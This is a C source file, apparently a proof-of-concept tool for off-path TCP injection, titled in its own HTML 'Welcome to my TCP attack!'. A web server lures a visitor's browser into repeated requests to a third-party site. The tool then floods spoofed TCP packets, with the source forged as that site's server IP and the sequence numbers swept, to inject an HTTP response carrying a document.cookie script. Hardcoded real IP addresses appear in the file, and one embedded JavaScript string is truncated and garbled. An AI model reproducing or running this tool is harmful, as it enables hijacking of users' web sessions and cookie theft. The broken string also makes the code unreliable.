#include <stdlib.h>
#include <event2/event.h>
#include <event2/event_struct.h>
#include <event2/listener.h>
#include <event2/http.h>
#include <event2/http_struct.h>
#include <event2/bufferevent.h>
#include <event2/buffer.h>
#include <event2/util.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/queue.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include "forge_socket.h"
#include <string.h>
#include "tcp_spoof.h"

#define DEFAULT_SPORT   888

#define RESPONSE "HTTP/1.0 200 OK\r\nContent-Length: %d\r\nConnection: close\r\nContent-type: text/html;\r\n\r\n%s\n"

#define HTML_CODE "<html><h1>Hi</h1>Welcome to my TCP attack! (v0.0.1)\n" \
    "<h1><div id=\"count\">0</div></h1>\n" \
    "<iframe id=\"foo\" src=\"http://hobocomp.com/?t=\"></iframe>\n" \
    "<script type=\"text/javascript\">\n" \
    "var count=0;\n" \
    "function run() {\n" \
    "   e=document.getElementById('foo');\n" \
    "   e.src='http://hobocomp.com/?t='+Math.random();\n" \
    "   document.getElementById('count').innerHTML = count++;\n" \
    "   setTimeout(run,250);\n" \
    "}\nsetTimeout(run,250);\n" \
    "</script></html>"

#define HTML_REFRESH "<html><h1>Hi</h1>Welcome to my TCP attack! (v0.0.1)\n" \
    "<h1>Obtaining your source port mapping...</h1>Well, really, PICKING your source port :)\n" \
    "<script type=\"text/javascript\">\n" \
    "function use_up_port(dport) {\n" \
    "   e = document.createElement('iframe');\n" \
    "   e.src='http://141.212.111.247:'+dport;\n" \
    "   document.getElementById('frames').appendChild(e);\n" \
    "}\n" \
    "var i;\n" \
    "for 
    "setTimeout(function(){document.location=\"http://141.212.111.247:888/\";}, 250);\n" \
    "</script>\n" \
    "</html>"

#define INJECT_HTTP "HTTP/1.1 200\nContent-Type: text/html;\n\n<script>alert(document.cookie);</script>\n"
#define INJECT_SIZE 1024
#define SEQ_STEP (5*INJECT_SIZE)

#define SERVER_IP "68.40.51.184"


void http_req_cb(struct bufferevent *bev, void *ctx)
{
    
    printf("sigh..\n");
    fflush(stdout);
    evbuffer_add(bufferevent_get_output(bev), RESPONSE, strlen(RESPONSE)); 
}

void tcp_events(struct bufferevent *bev, short events, void *ctx)
{
    return;
}

void on_read(int sock, short type, void *arg)
{
    printf("on_read(%d, %d, %p)\n", sock, type, arg);    
    
}

void echo_read_cb(struct bufferevent *bev, void *ctx)
{
    return;
}


void spoof_payload(evutil_socket_t sock, short type, void *arg)
{
    struct timeval start_time, cur_time;
    struct sockaddr_in *sin = (struct sockaddr_in *)arg;
    struct pkt_data pkt;
    char *pl;
    uint32_t seq_start = 0xffffffff;
    gettimeofday(&start_time, NULL);

    pl = malloc(INJECT_SIZE + 1);
    if (pl == NULL) {
        fprintf(stderr, "malloc fail\n");
        exit(1);
    }
    if (strlen(INJECT_HTTP) >= INJECT_SIZE) {
        fprintf(stderr, "INJECT_HTTP larger than INJECT_SIZE!\n");
        exit(1);
    }

    memset(pl, ' ', INJECT_SIZE);
    printf("copy from %lu for %lu bytes (no more than %d)\n", INJECT_SIZE - strlen(INJECT_HTTP), strlen(INJECT_HTTP), INJECT_SIZE);
    //strncpy(&pl[INJECT_SIZE - strlen(INJECT_HTTP)], INJECT_HTTP, INJECT_SIZE);
    memcpy(&pl[INJECT_SIZE - strlen(INJECT_HTTP)], INJECT_HTTP, strlen(INJECT_HTTP));
    pkt.daddr = sin->sin_addr.s_addr;
    pkt.saddr = inet_addr(SERVER_IP);
    pkt.dport = sin->sin_port;
    pkt.sport = htons(80);
    
    pkt.ack = 0;
    pkt.seq = seq_start;
    pkt.flags = 0;
    pkt.window = 4096;
    pkt.id = 1234;

    int pkt_count = 0;
    
    do {  
        tcp_forge_xmit(&pkt, pl, INJECT_SIZE);
        pkt.seq -= SEQ_STEP;
        pkt_count++;
        int i;
        for (i=0; i<1000; i++)
            gettimeofday(&cur_time, NULL);
        if ((pkt_count % 1000000) == 0) {
            printf("    sent %d pkts... (seq=%08x)\n", pkt_count, pkt.seq);
        }
    } while (((cur_time.tv_sec - start_time.tv_sec)*1000 - 
              (cur_time.tv_usec - start_time.tv_usec)/1000) < 180000);
    free(pl);
    printf("got %d packets off\n", pkt_count); 

}


void attack_http(struct event_base *base, struct sockaddr_in *sin)
{
    struct event *ev = evtimer_new(base, spoof_payload, sin);
    struct timeval tv;
    gettimeofday(&tv, NULL);
    tv.tv_usec += 10000;
    if (tv.tv_usec > 1000000) {
        tv.tv_sec += 1;
        tv.tv_usec -= 1000000;
    }
    evtimer_add(ev, &tv); 
}


int inc_addr(struct sockaddr_in *sin)
{
    static int count=1;
    static uint32_t last_ip=0;
    static uint16_t last_port=0;
    
    if (sin->sin_addr.s_addr == last_ip && ntohs(sin->sin_port) == (last_port + 1)) {
        count++;
    } else {
        count = 1;
    }
    last_ip = sin->sin_addr.s_addr;
    last_port = ntohs(sin->sin_port);
    return count;
}

/*
void on_tcp_accept(struct evconnlistener *listener, 
                   evutil_socket_t sock, struct sockaddr *addr, int socklen, void *ptr)
{

    struct sockaddr_in *sin = (struct sockaddr_in*)addr;
    struct event_base *base = evconnlistener_get_base(listener);
    struct bufferevent *bev = bufferevent_socket_new(base, sock, BEV_OPT_CLOSE_ON_FREE|BEV_OPT_DEFER_CALLBACKS);
    //bufferevent_setcb(bev, echo_read_cb, NULL, tcp_events, NULL);
    //bufferevent_enable(bev, EV_READ|EV_WRITE);

    int hits = inc_addr(sin); 
    printf("accept: %s:%d (this is #%d)\n", inet_ntoa(sin->sin_addr), ntohs(sin->sin_port), hits);

    if (hits >= 3) {
        attack_http(base, sin);
    } else {
        evbuffer_add_printf(bufferevent_get_output(bev), RESPONSE, strlen(HTML_REFRESH), HTML_REFRESH);
    }
   
}
*/

void favico(struct evhttp_request *req, void *arg)
{
    struct evbuffer *buf = evbuffer_new();
    evbuffer_add_printf(buf, "<html><h1>Not found</h1></html>");
    evhttp_send_reply(req, HTTP_NOTFOUND, "Not found", buf);
}


void on_http_req(struct evhttp_request *req, void *arg)
{
    char *addr;
    uint16_t port;
    struct sockaddr_in sin;
    struct evhttp_connection *evcon;
    struct event_base *base;

    evcon = evhttp_request_get_connection(req); 
    base = evhttp_connection_get_base(evcon);
    evhttp_connection_get_peer(evcon, &addr, &port);
    sin.sin_addr.s_addr = inet_addr(addr);
    sin.sin_port = htons(port); 

    struct evbuffer *buf = evbuffer_new();
    if (buf == NULL) {
        fprintf(stderr, "Failed to make a new evbuffer\n");
        exit(1);
    }
    
    int hits = inc_addr(&sin);
    printf("request: %s:%d (this is #%d)\n", inet_ntoa(sin.sin_addr), ntohs(sin.sin_port), hits);

    if (hits >= 3) {
        evbuffer_add_printf(buf, "%s", HTML_CODE);
        attack_http(base, &sin);
    } else {
        evbuffer_add_printf(buf, "%s", HTML_REFRESH);
        evhttp_add_header(evhttp_request_get_output_headers(req), "Connection", "close");
    }
    evhttp_send_reply(req, HTTP_OK, "OK", buf);
}

int main(int argc, char *argv[])
{
    int c;
    int sport = DEFAULT_SPORT;

    // Get options
    struct option opts[] = {
        {"sport", required_argument, NULL, 's'},
        {0, 0, 0, 0} };

    while ((c = getopt_long(argc, argv, "s:", opts, NULL)) != -1) {
        switch (c) {
        case 's':
            sport = atoi(optarg);
            if (sport < 0 || sport > 65535) {
                fprintf(stderr, "Error: invalid port %d\n", sport);
                return 1;
            }
            break;
        case '?':
        default:
            fprintf(stderr, "Error: need -s sport\n");
            return 1;
        }
    }

    
    struct event_base *base;
    int sock;
    struct sockaddr_in sin;


    init_sock();    // So we can spoof packets
    base = event_base_new();

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }
    int val = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));

    sin.sin_family      = AF_INET;
    sin.sin_addr.s_addr = inet_addr("0.0.0.0");
    sin.sin_port        = htons(sport);

    if (bind(sock, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        perror("bind");
        return -1;
    }
    fcntl(sock, F_SETFL, O_NONBLOCK); // Eh, ok.

    if (listen(sock, 5) < 0) {
        perror("listen");
        return -1;
    }
   
    struct evhttp *http = evhttp_new(base);
    evhttp_accept_socket(http, sock);
    evhttp_set_cb(http, "/favicon.ico", favico, NULL);
    evhttp_set_gencb(http, on_http_req, NULL);

    /*
    struct evconnlistener *listener;
    listener = evconnlistener_new(base, on_tcp_accept, NULL, LEV_OPT_CLOSE_ON_FREE, -1, sock); 
    */

    event_base_dump_events(base, stdout);
    event_base_dispatch(base);
    
    return 0;
}
